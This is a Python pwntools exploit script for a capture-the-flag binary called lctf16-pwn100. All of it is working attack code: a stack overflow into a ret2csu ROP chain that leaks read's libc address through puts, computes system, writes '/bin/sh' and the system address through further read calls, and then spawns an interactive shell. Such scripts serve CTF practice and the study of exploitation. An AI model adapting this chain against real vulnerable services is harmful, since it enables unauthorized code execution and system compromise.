#coding = utf-8
from pwn import *
#from LibcSearcher import *
io = process("./lctf16-pwn100")
#io = remote("111.200.241.244",35753)
elf = ELF("./lctf16-pwn100")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
context.log_level = 'debug'

binsh_addr = 0x601068				# extern segment
main_addr = 0x4006b8
system_plt = 0x601070

part1 = 0x40075a					# com_gadget parts
part2 = 0x400740
def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
	payload  = p64(part1)			# part1 entry pop_rbx_rbp_r12_r13_r14_r15_ret
	payload += p64(0x0)			# rbx must be 0x0
	payload += p64(0x1)			# rbp must be 0x1
	payload += p64(jmp2)			# r12 jump to
	payload += p64(arg3)			# r13  -> rdx    arg3
	payload += p64(arg2)			# r14  -> rsi    arg2
	payload += p64(arg1)			# r15d -> edi    arg1
	payload += p64(part2)			# part2 entry will call [r12+rbx*0x8]
	payload += 'A' * 56			# junk 6*8+8=56
	return payload

def leak():
	global system_addr,binsh_addr,system_plt

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['puts'], elf.got['read'])
	payload += p64(main_addr)    
	payload  = payload.ljust(200, "A")

	io.send(payload)

	io.recvuntil("bye~\n")
	read_addr = u64(io.recv()[:-1].ljust(8, "\x00"))
	libc_base = read_addr - libc.symbols["read"]
	system_addr = libc.symbols["system"] + libc_base

	log.info("read address: 0x%x" % read_addr)
	log.info("system address: 0x%x" % system_addr)

def pwn():
	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['read'], 0,binsh_addr,8)
	payload += p64(main_addr) 
	payload  = payload.ljust(200, "A")
	io.send(payload)

	io.recvuntil("bye~\n")
	io.send('/bin/sh\x00')

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['read'], 0,system_plt,8)
	payload += p64(main_addr) 
	payload  = payload.ljust(200, "A")
	io.send(payload)

	io.recvuntil("bye~\n")
	io.send(p64(system_addr))

	#gdb.attach(io)
	payload  = "A"*(0x40 + 8)#call
	payload += com_gadget(part1, part2, system_plt, binsh_addr)
	payload  = payload.ljust(200, "A")
	io.send(payload)

	io.interactive()

leak()
pwn()
